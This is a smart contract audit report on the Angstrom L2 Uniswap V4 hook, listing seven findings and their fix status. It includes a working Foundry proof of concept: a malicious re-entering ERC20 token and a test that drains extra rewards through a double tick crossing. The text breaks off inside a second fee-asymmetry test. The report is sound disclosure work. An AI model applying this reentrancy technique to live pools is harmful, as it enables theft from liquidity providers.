# Angstrom L2 Audit Report | Cergyk - 26/01/2026

# 1. About cergyk

cergyk is a smart contract security expert, highly ranked accross a variety of audit contest platforms. He has helped multiple protocols in preventing critical exploits since 2022. Please find more information about his work on the personal website: https://cergyk.dev

# 2. Introduction

A time-boxed security review of the `Angstrom L2` protocol was done by cergyk, with a focus on the security aspects of the application's smart contracts implementation.

# 3. Disclaimer
A smart contract security review can never verify the complete absence of vulnerabilities. This is
a time, resource and expertise bound effort aimed at finding as many vulnerabilities as
possible. We can not guarantee 100% security after the review or even if the review will find any
problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-
chain monitoring are strongly recommended.

# 4. About Angstrom L2 and scope

Angstrom is a protocol which takes advantage of the power of Uniswap V4 hooks to protect LPs from the adverse effects of MEV. Swaps and Liquidity modifications are subject to a priority fee tax, enabling to compensate for the loss incurred by MEV flow.


# 5. Security Assessment Summary

***review commit hash* - [8714af69](https://github.com/SorellaLabs/l2-angstrom/tree/8714af691ddc6b2a393950db6fd98b14578911a9)**

***fixes review commit hash* - [ef04b54e](https://github.com/SorellaLabs/l2-angstrom/commit/ef04b54e17730c2d255d8d8c9a1ff7c5d3d90488)**

## Deployment chains

- All EVM chains

## Scope

The following smart contracts are in scope of the audit: (total: `1383 SLoC`)

**DeFi integrations:**
- Uniswap V4

**Contracts:**
- src/interfaces/IUniV4.sol
- src/libraries/CompensationPriceFinder.sol
- src/libraries/Math512Lib.sol
- src/libraries/MixedSignLib.sol
- src/libraries/PoolKeyHelperLib.sol
- src/libraries/Q96MathLib.sol
- src/libraries/TickIterator.sol
- src/libraries/TickLib.so
- src/modules/UniConsumer.sol
- src/types/PoolRewards.so
- src/AngstromL2.sol
- src/AngstromL2Factory.sol
- src/hook-config.sol
- src/Miner.huff


# 6. Executive Summary

A security review of the contracts of Angstrom L2 has been conducted during **2 weeks**.
A total of **7 findings** have been identified and can be classified as below:

### Protocol
| | |
|---------------|--------------------|
| **Protocol Name** | Angstrom L2 |
| **Repository**    | [Angstrom L2](https://github.com/SorellaLabs/l2-angstrom/tree/8714af691ddc6b2a393950db6fd98b14578911a9) |
| **Date**          | January 12th 2026 - January 24th 2026 |
| **Type**          | Uniswap V4 Hook |

### Findings Count
| Severity  | Findings Count |
|-----------|----------------|
| Critical  |     0           |
| High      |     1           |
| Medium    |     1           |
| Low       |     2           |
| Info/Gas       |     3         |
| **Total findings**| 7         |


# 7. Findings summary
| Findings | Fix status|
|-----------|-|
|H-1: Reentrancy in afterSwap Corrupts Reward Accounting via Tick Boundary Double-Flip| Fixed |
|M-1: Creator fee and lp fee split is dependent on the type of swap (exactIn, exactOut, ETH in, ETH out)| Fixed |
|L-1: AngstromL2::initializeNewPool `key.hooks` is unchecked for a pool attached by owner| Fixed |
|L-2 MAX_DEFAULT_PROTOCOL_FEE_MULTIPLE_E6 is overly permissive, should be below 1e6| Fixed |
|INFO-1 CompensationPriceFinder `getZeroForOne` and `getOneForZero` should have same signatures| Fixed |
|INFO-2 Hooks deployment through the factory can be front-run| Acknowledged |
|INFO-3 Minor code suggestions| Fixed |

# 8. Findings

## H-1: Reentrancy in afterSwap corrupts reward accounting via tick boundary double-flip
### Vulnerability Details

### Root Cause

The fee collection in `afterSwap` involves external token transfers via `UNI_V4.take()`, which can reenter via `PoolManager.swap()`. Since the rewarder crosses ticks for the outer swap **after** the reentrant call and uses transient variables of the inner swap, the reward distribution for the pool is corrupted. We will show that such a pool will enable us to claim more rewards than have been distributed to it, effectively stealing rewards from other pools connected to the hook.

[src/AngstromL2.sol:366-374](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L356-L367)
```solidity
if (feeCurrency == NATIVE_CURRENCY) {
    UNI_V4.take(
        NATIVE_CURRENCY, address(this), creatorSwapFeeAmount + creatorTaxShareInEther
    );
    UNI_V4.take(NATIVE_CURRENCY, FACTORY, protocolSwapFeeAmount + protocolTaxShareInEther);
} else {
    UNI_V4.take(NATIVE_CURRENCY, address(this), creatorTaxShareInEther);
    UNI_V4.take(NATIVE_CURRENCY, FACTORY, protocolTaxShareInEther);
    //@audit feeCurrency.transfer may reenter
    UNI_V4.take(feeCurrency, address(this), creatorSwapFeeAmount);
    UNI_V4.take(feeCurrency, FACTORY, protocolSwapFeeAmount);
}
```

[src/AngstromL2.sol:366-374](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L287-L297)
```solidity
    (uint256 feeInUnspecified, uint256 lpCompensationAmount) =
        _computeAndCollectProtocolSwapFee(key, id, params, swapDelta, _getSwapTaxAmount());
    hookDeltaUnspecified = feeInUnspecified.toInt128();

    PoolKey calldata key_ = key;
    Slot0 slot0BeforeSwap = Slot0.wrap(slot0BeforeSwapStore.get());
    Slot0 slot0AfterSwap = UNI_V4.getSlot0(id);
    //@audit updateAfterTickMove crosses ticks after reentrancy has happened. Corrupting tick boundaries and reward distribution.
    rewards[id].updateAfterTickMove(
        id, UNI_V4, slot0BeforeSwap.tick(), slot0AfterSwap.tick(), key_.tickSpacing
    );
```

The owner of a (so far) legitimate `AngstromL2` hook can initialize a new pool with a malicious token `ReentrantERC20` by calling `initializeNewPool()` directly on the hook.

### Reentrancy walkthrough

The inner swap executes along the following steps:

1. **Overwrite transient storage** in its `beforeSwap`:
   [src/AngstromL2.sol:266-268](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L264-L266)
   ```solidity
   slot0BeforeSwapStore.set(Slot0.unwrap(UNI_V4.getSlot0(id)));
   liquidityBeforeSwap.set(UNI_V4.getPoolLiquidity(id));
   ```

2. **Completes its full swap cycle** (beforeSwap → swap → afterSwap)

3. **Returns control to the outer afterSwap**, which now operates on **corrupted transient storage**, and will be able to cross a tick boundary again in the same direction when executing `updateAfterTickMove`.

### The Double-Flip Mechanism

The corruption occurs in `updateAfterTickMove()` which flips tick boundary values when the price crosses them:

[src/types/PoolRewards.sol#L203-L204](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/types/PoolRewards.sol#L203-L204):
```solidity
self.rewardGrowthOutsideX128[tick] =
    globalGrowthX128 - self.rewardGrowthOutsideX128[tick];
```

Let's study how the double-crossing of a tick impacts claimable rewards.

#### Setup

To simplify the explanation, let us consider a pool only having two initialized positions at ranges `[-10, 0]` and `[0, 10]`, thus sharing tick 0 as a boundary. This means that there is no reward growth outside for ticks 10 and -10, allowing us to focus only on the boundary of tick 0:

#### Rewards calculation

The reward accounting mechanism of `PoolRewards` is the same as the one in `UniswapV3/V4`, and has two cases:

1/ Current tick is inside position range for which rewards are claimed for:
-    The formula computes `currentGlobalGrowth - all outer growth`

2/ Current tick is outside position range:
-   The formula computes `outside growth of the most recently crossed boundary - the other boundary outside growth`.

[src/types/PoolRewards.sol:142-160](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/types/PoolRewards.sol#L142-L161):
```solidity
function getGrowthInsideX128(...) internal view returns (uint256 growthInsideX128) {
    uint256 lowerGrowthX128 = self.rewardGrowthOutsideX128[lowerTick];
    uint256 upperGrowthX128 = self.rewardGrowthOutsideX128[upperTick];

    if (currentTick < lowerTick) {
        return lowerGrowthX128 - upperGrowthX128;
    }
    if (upperTick <= currentTick) {
        return upperGrowthX128 - lowerGrowthX128;
    }
    return self.globalGrowthX128 - lowerGrowthX128 - upperGrowthX128;
}
```

#### Concrete example

Let's suppose that initially `globalGrowthX128` is 100, current tick is -5 (thus in position A [-10, 0]):
- `getGrowthInsideA: self.globalGrowthX128 - lowerGrowthX128 - upperGrowthX128 = 100 - 0 - 0 = 100`
- `getGrowthInsideB: lowerGrowthX128 - upperGrowthX128 = 0 - 0 = 0`

If we cross the tick 0 once, `rewardsGrowthOutside` for tick 0 becomes 100, and since we are now inside position B:
- `getGrowthInsideA: upperGrowthX128 - lowerGrowthX128 = 100 - 0 = 100`
- `getGrowthInsideB: self.globalGrowthX128 - lowerGrowthX128 - upperGrowthX128 = 100 - 100 - 0 = 0`

> Rewards are correctly preserved.

If we cross the tick 0 again (`rewardsGrowthOutside` for tick 0 becomes 0 again), but current tick is still inside position B (the attack scenario):

- `getGrowthInsideA: upperGrowthX128 - lowerGrowthX128 = 0 - 0 = 0 (still using the outside formula)`
- `getGrowthInsideB: self.globalGrowthX128 - lowerGrowthX128 - upperGrowthX128 = 100 - 0 - 0 = 100`


Now position B is able to claim the rewards which were initially meant for position A. If position A rewards are claimed before the double-tick-cross, B can also claim rewards, and more rewards than distributed are claimed.

### Proof of Concept

The test `test_double_flip_swaps_reward_shares` in `test/ReentrancyPOC.t.sol` demonstrates this attack:

- test/ReentrancyPOC.t.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {BaseTest} from "./_helpers/BaseTest.sol";
import {RouterActor} from "./_mocks/RouterActor.sol";
import {ReentrantERC20} from "./_mocks/ReentrantERC20.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";

import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {LPFeeLibrary} from "v4-core/src/libraries/LPFeeLibrary.sol";
import {Slot0} from "v4-core/src/types/Slot0.sol";

import {AngstromL2Factory} from "../src/AngstromL2Factory.sol";
import {AngstromL2} from "../src/AngstromL2.sol";
import {POOLS_MUST_HAVE_DYNAMIC_FEE} from "../src/hook-config.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";
import {IHookAddressMiner} from "../src/interfaces/IHookAddressMiner.sol";

import {console} from "forge-std/console.sol";
import {FormatLib} from "super-sol/libraries/FormatLib.sol";

/// @title ReentrancyPOC
/// @notice Proof of Concept demonstrating reentrancy vulnerability in AngstromL2's afterSwap hook
/// @dev The vulnerability: During afterSwap, when UNI_V4.take() transfers tokens, a malicious
///      token with transfer hooks (like ERC777) can reenter and execute another swap.
///      This corrupts the transient storage (liquidityBeforeSwap, slot0BeforeSwapStore)
///      that the first swap's afterSwap relies on for reward distribution.
contract ReentrancyPOCTest is BaseTest {
    using FormatLib for *;
    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;
    using TickMath for int24;

    UniV4Inspector manager;
    RouterActor router;
    AngstromL2Factory factory;
    AngstromL2 angstrom;
    address factoryOwner = makeAddr("factory_owner");
    address hookOwner = makeAddr("hook_owner");
    IHookAddressMiner miner;

    ReentrantERC20 maliciousToken;

    bool constant HUFF2_INSTALLED = true;

    function setUp() public {
        vm.roll(100);
        manager = new UniV4Inspector();
        router = new RouterActor(manager);
        vm.deal(address(manager), 1_000 ether);
        vm.deal(address(router), 100 ether);

        // Deploy malicious token instead of regular MockERC20
        maliciousToken = new ReentrantERC20();
        maliciousToken.mint(address(router), 1_000_000_000e18);
        maliciousToken.mint(address(maliciousToken), 1_000_000e18); // For reentrant swaps
        vm.deal(address(maliciousToken), 100 ether); // ETH for reentrant swaps

        bytes memory minerCode = HUFF2_INSTALLED
            ? getMinerCode(address(manager), false)
            : getHardcodedMinerCode(address(manager));
        IHookAddressMiner newMiner;
        assembly ("memory-safe") {
            newMiner := create(0, add(minerCode, 0x20), mload(minerCode))
        }
        require(address(newMiner) != address(0), "miner deployment failed");
        miner = newMiner;

        factory = new AngstromL2Factory(factoryOwner, manager, miner);

        vm.prank(address(factory));
        bytes32 salt = miner.mineAngstromHookAddress(hookOwner);

        angstrom = factory.deployNewHook(hookOwner, salt);
    }

    function initializePoolWithMaliciousToken(int24 tickSpacing, int24 startTick)
        internal
        returns (PoolKey memory key)
    {
        return initializePoolWithMaliciousToken(tickSpacing, startTick, 0.02e6, 0.1e6);
    }

    function initializePoolWithMaliciousToken(
        int24 tickSpacing,
        int24 startTick,
        uint24 creatorSwapFeeE6,
        uint24 creatorTaxFeeE6
    ) internal returns (PoolKey memory key) {
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(maliciousToken)),
            fee: POOLS_MUST_HAVE_DYNAMIC_FEE ? LPFeeLibrary.DYNAMIC_FEE_FLAG : 0,
            tickSpacing: tickSpacing,
            hooks: IHooks(address(angstrom))
        });

        vm.prank(hookOwner);
        angstrom.initializeNewPool(
            key, TickMath.getSqrtPriceAtTick(startTick), creatorSwapFeeE6, creatorTaxFeeE6
        );

        return key;
    }

    function addLiquidity(
        PoolKey memory key,
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidityAmount
    ) internal returns (BalanceDelta delta) {
        (delta,) = router.modifyLiquidity(
            key, tickLower, tickUpper, int256(uint256(liquidityAmount)), bytes32(0)
        );
    }

    function getRewards(PoolKey memory key, int24 tickLower, int24 tickUpper)
        internal
        view
        returns (uint256)
    {
        return angstrom.getPendingPositionRewards(
            key, address(router), tickLower, tickUpper, bytes32(0)
        );
    }

    /// @notice POC: Double-flip corruption allows claiming rewards twice
    /// @dev A single owner has two positions sharing tick 0 as boundary.
    ///      After claiming rewards from position A, the owner executes a
    ///      double-tick-cross manipulation that corrupts rewardGrowthOutsideX128[0].
    ///      This causes position B to show inflated claimable rewards.
    ///
    ///      Flow:
    ///      1. Owner adds liquidity to positions A [-10, 0] and B [0, 10]
    ///      2. Swaps accumulate rewards for position A
    ///      3. Owner claims rewards from position A
    ///      4. Owner executes reentrancy attack (double-tick-cross)
    ///      5. Position B now shows claimable rewards (corrupted accounting)
    ///
    ///      Note: Actually claiming from B would cause underflow, but the
    ///      corrupted claimable amount demonstrates the accounting is broken.
    function test_double_flip_swaps_reward_shares() public {
        // === SETUP ===
        PoolKey memory key = initializePoolWithMaliciousToken(10, 5, 0, 0); // Start at tick 5

        // Single owner adds two positions sharing tick 0 as boundary
        addLiquidity(key, -10, 0, 10_000e18);  // Position A: [-10, 0]
        addLiquidity(key, 0, 10, 10_000e18);   // Position B: [0, 10]

        console.log("=== DOUBLE-FLIP REWARD CORRUPTION POC ===");
        console.log("Position A: [-10, 0]");
        console.log("Position B: [0, 10]");
        console.log("Both owned by same user, sharing tick 0 as boundary");
        console.log("");

        // === STEP 1: Accumulate rewards for Position A and B===
        console.log("=== STEP 1: Accumulate rewards for Position A and B===");

        setPriorityFee(10 gwei);
        uint256 taxPerSwap = angstrom.getSwapTaxAmount(10 gwei);
        console.log("Tax per swap (10 gwei priority):", taxPerSwap);

        // Move tick into A's range (below tick 0)
        router.swap(key, true, -5 ether, int24(-5).getSqrtPriceAtTick());

        // Do swaps within A's range to accumulate rewards
        for (uint256 i = 0; i < 10; i++) {
            if (i % 2 == 0) {
                router.swap(key, true, -1 ether, int24(-8).getSqrtPriceAtTick());
            } else {
                router.swap(key, false, 1 ether, int24(-2).getSqrtPriceAtTick());
            }
        }

        router.swap(key, false, 10 ether, int24(5).getSqrtPriceAtTick());

        uint256 rewardsA_beforeClaim = getRewards(key, -10, 0);
        uint256 rewardsB_beforeClaim = getRewards(key, 0, 10);

        console.log("");
        console.log("After accumulation (12 swaps):");
        console.log("  Position A [-10,0] claimable:", rewardsA_beforeClaim);
        console.log("  Position B [0,10] claimable:", rewardsB_beforeClaim);
        console.log("  Total claimable:", rewardsA_beforeClaim + rewardsB_beforeClaim);

        // === STEP 2: Claim rewards from Position A ===
        console.log("");
        console.log("=== STEP 2: Claim rewards from Position A ===");

        uint256 balanceBefore = address(router).balance;
        // Claim by removing 0 liquidity
        router.modifyLiquidity(key, -10, 0, 0, bytes32(0));
        uint256 balanceAfter = address(router).balance;
        uint256 claimedFromA = balanceAfter - balanceBefore;

        console.log("  Claimed from Position A:", claimedFromA);

        uint256 rewardsA_afterClaim = getRewards(key, -10, 0);
        uint256 rewardsB_afterClaim = getRewards(key, 0, 10);

        console.log("  Position A [-10,0] claimable after:", rewardsA_afterClaim);
        console.log("  Position B [0,10] claimable after:", rewardsB_afterClaim);

        assertTrue(claimedFromA > 0, "Should have claimed rewards from A");
        assertTrue(rewardsA_afterClaim == 0, "A should have 0 claimable after claim");

        // === STEP 3: Execute double-tick-cross manipulation ===
        console.log("");
        console.log("=== STEP 3: Execute reentrancy attack (double-tick-cross) ===");

        bumpBlock();
        maliciousToken.setAttackParams(manager, key, 1);
        maliciousToken.setSwapConfig(true, -3 ether); // Inner swap crosses tick 0
        maliciousToken.enableAttack();

        // Outer swap: tick 5 → 2 (stays above tick 0)
        // Inner swap: tick 2 → negative (crosses tick 0)
        // Both afterSwaps call updateAfterTickMove on same range → double-flip tick 0

        // @dev note that this "manipulation" swap adds some rewards to the ranges
        // @dev but it is negligible compared to initially accumulated rewards
        router.swap(key, true, -1 ether, int24(2).getSqrtPriceAtTick());

        // === STEP 4: Check corrupted claimable amounts ===
        console.log("");
        console.log("=== STEP 4: Check corrupted state ===");

        uint256 rewardsA_afterAttack = getRewards(key, -10, 0);
        uint256 rewardsB_afterAttack = getRewards(key, 0, 10);

        console.log("  Position A [-10,0] claimable:", rewardsA_afterAttack, "(underflow)");
        console.log("  Position B [0,10] claimable:", rewardsB_afterAttack);

        // === SUMMARY ===
        console.log("");
        console.log("========================================");
        console.log("=== CORRUPTION SUMMARY ===");
        console.log("========================================");
        console.log("BEFORE attack (after claiming A):");
        console.log("  Position A claimable + claimed:", rewardsA_afterClaim + claimedFromA);
        console.log("  Position B claimable:", rewardsB_afterClaim);
        console.log("");
        console.log("AFTER attack:");
        console.log("  Position A claimable + claimed:", rewardsA_afterAttack + claimedFromA, "(underflow)");
        console.log("  Position B claimable:", rewardsB_afterAttack);
        console.log("");
        console.log("Claimable + claimed is almost 2x what has been distributed", claimedFromA + rewardsB_afterAttack, rewardsA_beforeClaim + rewardsB_beforeClaim);
    }
}
```

- test/_mocks/ReentrantERC20.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {MockERC20} from "super-sol/mocks/MockERC20.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";

/// @notice A malicious ERC20 that reenters during transfer (simulating ERC777-like behavior)
/// @dev Used to demonstrate reentrancy vulnerability in AngstromL2's afterSwap hook
contract ReentrantERC20 is MockERC20 {
    IPoolManager public poolManager;
    PoolKey public attackPoolKey;
    bool public attackEnabled;
    bool public inAttack;
    uint256 public attackCount;
    uint256 public maxAttacks;

    // Track state for POC verification
    bool public reentrancyTriggered;
    int256 public reentrantSwapAmount;
    bool public reentrantSwapSucceeded;

    event ReentrancyAttempted(uint256 attackNumber);
    event ReentrancyExecuted(uint256 attackNumber, int128 amount0, int128 amount1);
    event ReentrancyFailed(uint256 attackNumber, bytes reason);

    function setAttackParams(
        IPoolManager _poolManager,
        PoolKey memory _poolKey,
        uint256 _maxAttacks
    ) external {
        poolManager = _poolManager;
        attackPoolKey = _poolKey;
        maxAttacks = _maxAttacks;
    }

    function enableAttack() external {
        attackEnabled = true;
        attackCount = 0;
        reentrancyTriggered = false;
        reentrantSwapSucceeded = false;
    }

    function disableAttack() external {
        attackEnabled = false;
    }

    /// @notice Override transfer to add reentrancy attack
    /// @dev This simulates a token with transfer hooks (like ERC777)
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Execute the actual transfer first
        bool result = super.transfer(to, amount);

        // Attempt reentrancy if enabled and not already in attack
        // The attack happens when the hook's afterSwap calls UNI_V4.take()
        // which triggers this transfer
        if (attackEnabled && !inAttack && attackCount < maxAttacks) {
            inAttack = true;
            attackCount++;
            reentrancyTriggered = true;

            emit ReentrancyAttempted(attackCount);

            // Reenter by initiating another swap while still in afterSwap
            // We're already in the Uniswap V4 unlock context, so we call swap directly
            // and settle deltas within the same unlock
            _executeReentrantSwap();

            inAttack = false;
        }

        return result;
    }

    int256 public configuredSwapAmount;
    bool public configuredZeroForOne;

    function setSwapConfig(bool zeroForOne, int256 amount) external {
        configuredZeroForOne = zeroForOne;
        configuredSwapAmount = amount;
    }

    /// @notice Execute a reentrant swap within the existing unlock context
    /// @dev This directly calls swap and settles deltas without a nested unlock
    function _executeReentrantSwap() internal {
        reentrantSwapAmount = configuredSwapAmount;

        // Build swap params based on configuration
        SwapParams memory params = SwapParams({
            zeroForOne: configuredZeroForOne,
            amountSpecified: reentrantSwapAmount,
            sqrtPriceLimitX96: configuredZeroForOne
                ? TickMath.MIN_SQRT_PRICE + 1
                : TickMath.MAX_SQRT_PRICE - 1
        });

        // Execute swap directly - we're already in an unlock context
        // This will trigger beforeSwap and afterSwap hooks, corrupting transient storage
        BalanceDelta delta = poolManager.swap(attackPoolKey, params, "");

        // Settle the deltas within the existing unlock context
        _settleDeltas(attackPoolKey, delta);
        reentrantSwapSucceeded = true;
        emit ReentrancyExecuted(attackCount, delta.amount0(), delta.amount1());
    }

    function _settleDeltas(PoolKey memory key, BalanceDelta delta) internal {
        // Handle currency0 (ETH)
        if (delta.amount0() < 0) {
            // We owe ETH - sync and settle
            poolManager.sync(key.currency0);
            poolManager.settle{value: uint128(-delta.amount0())}();
        } else if (delta.amount0() > 0) {
            // We receive ETH
            poolManager.take(key.currency0, address(this), uint128(delta.amount0()));
        }

        // Handle currency1 (this token)
        if (delta.amount1() < 0) {
            // We owe tokens - sync, transfer, then settle
            poolManager.sync(key.currency1);
            // Use MockERC20.transfer to avoid triggering reentrancy again
            MockERC20.transfer(address(poolManager), uint128(-delta.amount1()));
            poolManager.settle();
        } else if (delta.amount1() > 0) {
            // We receive tokens
            poolManager.take(key.currency1, address(this), uint128(delta.amount1()));
        }
    }

    // Allow receiving ETH for swaps
    receive() external payable {}
}
```


**Test Output:**
```
========================================
=== CORRUPTION SUMMARY ===
========================================
BEFORE attack (after claiming A):
Position A claimable + claimed: 535672518943819693
Position B claimable: 52327481056180305

AFTER attack:
Position A claimable + claimed: 3402823669209384634633746074317682114560000101327481056180305 (underflow)
Position B claimable: 584672518943819693

Claimable + claimed for A and B is almost 2x what has been distributed 1120345037887639386 587999999999999998
```

### Recommended Mitigation

Add a reentrancy guard on the afterSwap() hook to prevent nested swaps.

```diff
    function afterSwap(
        address,
        PoolKey calldata key,
        SwapParams calldata params,
        BalanceDelta swapDelta,
        bytes calldata
-    ) external override returns (bytes4, int128 hookDeltaUnspecified) {
+    ) external override nonReentrant returns (bytes4, int128 hookDeltaUnspecified) {
```

### Fix Review

#### Sorella Labs

Fixed in 106a5e27.

#### Cergyk

Fixed.

## M-1: Creator fee and lp fee split is dependent on the type of swap (exactIn, exactOut, ETH in, ETH out)

### Description

The `AngstromL2` hook takes a swap fee from the `unspecifiedAmount` to be distributed to the creator of the hook (`creatorSwapFee`). However, that leads to an inconsistency with the fact that the `lpFee` is systematically taken out from the input of the swap.

[AngstromL2.sol#L329-L334](https://github.com/SorellaLabs/l2-angstrom/blob/8714af691ddc6b2a393950db6fd98b14578911a9/src/AngstromL2.sol#L329-L334):
```solidity
    int128 unspecifiedDelta =
        exactIn != params.zeroForOne ? swapDelta.amount0() : swapDelta.amount1();
    uint256 absTargetAmount = unspecifiedDelta.abs();
    fee = exactIn
        ? absTargetAmount * totalSwapFeeRateE6 / FACTOR_E6
        : absTargetAmount * totalSwapFeeRateE6 / (FACTOR_E6 - totalSwapFeeRateE6);
```

Indeed, when the swap is of the type `exactIn`, the creator fee applies to the output amount (unspecified), which does not include the `lpFee`. On the other hand, when the swap is of type `exactOut`, the creator fee applies to the unspecified input amount (which includes `lpFee`).

We notice, however, that the aggregate fee amount stays the same in both cases and can be computed as `1 - (1 - lpFee)(1 - creatorFee)`. But since the order in which both fees are computed is dependent on the swap being `exactIn`/`exactOut`, the split between `lpFee` and `creatorFee` ends up being different.


> As an additional note, there is also an inconsistency with regard to the swap tax, which is always taken from the ETH side before the swap. This tax will increase the creator fee if we have an ETH input and exactOut type swap.

### POC

test/FeeAsymmetryPOC.t.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BaseTest} from "./_helpers/BaseTest.sol";
import {RouterActor} from "./_mocks/RouterActor.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";
import {MockERC20} from "super-sol/mocks/MockERC20.sol";

import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";

import {AngstromL2Factory} from "../src/AngstromL2Factory.sol";
import {AngstromL2} from "../src/AngstromL2.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";
import {IHookAddressMiner} from "../src/interfaces/IHookAddressMiner.sol";

/// @title FeeAsymmetryPOCTest
/// @notice Test demonstrating fee calculation asymmetry based on swap direction
contract FeeAsymmetryPOCTest is BaseTest {
    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;

    UniV4Inspector manager;
    RouterActor router;
    AngstromL2Factory factory;
    AngstromL2 angstrom;

    address factoryOwner = makeAddr("factory_owner");
    address hookOwner = makeAddr("hook_owner");
    IHookAddressMiner miner;

    uint24 constant LP_FEE = 10000; // 1%
    uint24 constant CREATOR_SWAP_FEE = 100000; // 10%
    uint24 constant CREATOR_TAX_FEE = 0; // All tax to LPs

    bool constant HUFF2_INSTALLED = true;

    function setUp() public {
        vm.roll(100);
        manager = new UniV4Inspector();
        router = new RouterActor(manager);

        vm.deal(address(manager), 100_000_000 ether);
        vm.deal(address(router), 100_000_000 ether);

        bytes memory minerCode = HUFF2_INSTALLED
            ? getMinerCode(address(manager), false)
            : getHardcodedMinerCode(address(manager));
        IHookAddressMiner newMiner;
        assembly ("memory-safe") {
            newMiner := create(0, add(minerCode, 0x20), mload(minerCode))
        }
        miner = newMiner;

        factory = new AngstromL2Factory(factoryOwner, manager, miner);

        vm.prank(address(factory));
        bytes32 salt = miner.mineAngstromHookAddress(hookOwner);
        angstrom = factory.deployNewHook(hookOwner, salt);
    }

    function _createPool(MockERC20 tkn) internal returns (PoolKey memory key) {
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(tkn)),
            fee: LP_FEE,
            tickSpacing: 10,
            hooks: IHooks(address(angstrom))
        });

        vm.prank(hookOwner);
        angstrom.initializeNewPool(key, TickMath.getSqrtPriceAtTick(0), CREATOR_SWAP_FEE, CREATOR_TAX_FEE);
        router.modifyLiquidity(key, -10, 10, 1000e18, bytes32(0));
    }

    /// @notice Create pool with high liquidity for minimal price impact
    function _createHighLiquidityPool(MockERC20 tkn) internal returns (PoolKey memory key) {
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(tkn)),
            fee: LP_FEE,
            tickSpacing: 10,
            hooks: IHooks(address(angstrom))
        });

        vm.prank(hookOwner);
        angstrom.initializeNewPool(key, TickMath.getSqrtPriceAtTick(0), CREATOR_SWAP_FEE, CREATOR_TAX_FEE);

        // Very high liquidity to minimize price impact
        // At tick 0, price is 1:1, so we need equal amounts
        router.modifyLiquidity(key, -10, 10, 40000000000e18, bytes32(0));
    }

    function test_allFourSwapCases() public {
        console.log("=== All Four Swap Cases: Fee Base Analysis ===\n");
        console.log("LP Fee: 1%, Creator Fee: 10%");
        console.log("Using HIGH liquidity to minimize price impact\n");

        //We intentionally set a very high tax, to highlight the inconsistencies impacting creator fee
        uint256 priorityFee = 100 gwei;
        uint256 tax = angstrom.getSwapTaxAmount(priorityFee);
        console.log("Tax: %d wei", tax);

        // Use larger swap to make tax relatively small
        int256 swapAmount = 1 ether; // Tax is ~0.5% of this
        console.log("Swap amount: %d (tax is ~0.5%% of this)\n", uint256(swapAmount));

        setPriorityFee(priorityFee);

        // Case 1: zeroForOne exactIn (ETH input, Token output)
        uint output1;
        uint256 fee1;
        {
            MockERC20 tkn = new MockERC20();
            tkn.mint(address(router), 1e30);
            PoolKey memory key = _createHighLiquidityPool(tkn);

            console.log("Case 1: zeroForOne exactIn (ETH->Token)");

            uint256 feeBefore = tkn.balanceOf(address(angstrom));
            BalanceDelta delta = router.swap(key, true, -swapAmount, TickMath.MIN_SQRT_PRICE + 1);
            uint256 feeAfter = tkn.balanceOf(address(angstrom));
            fee1 = feeAfter - feeBefore;

            //@audit save output to reuse in exactOut swap
            output1 = uint256(int256(delta.amount1()));

            console.log("  ETH in: %d, Tokens out: %d", uint256(-int256(delta.amount0())), output1);
            console.log("  Creator fee (tokens): %d\n", fee1);
        }

        bumpBlock();

        // Case 2: zeroForOne exactOut - request same token output as Case 1
        uint256 fee2;
        {
            MockERC20 tkn = new MockERC20();
            tkn.mint(address(router), 1e30);
            PoolKey memory key = _createHighLiquidityPool(tkn);

            console.log("Case 2: zeroForOne exactOut (want ~same tokens as Case 1)");

            uint256 feeBefore = address(angstrom).balance;
            //@audit 
            BalanceDelta delta = router.swap(key, true, int256(output1), TickMath.MIN_SQRT_PRICE + 1);
            uint256 feeAfter = address(angstrom).balance;
            fee2 = feeAfter - feeBefore;

            console.log("  ETH in: %d, Tokens out: %d", uint256(-int256(delta.amount0())), uint256(int256(delta.amount1())));
            console.log("  Creator fee (ETH): %d\n", fee2);
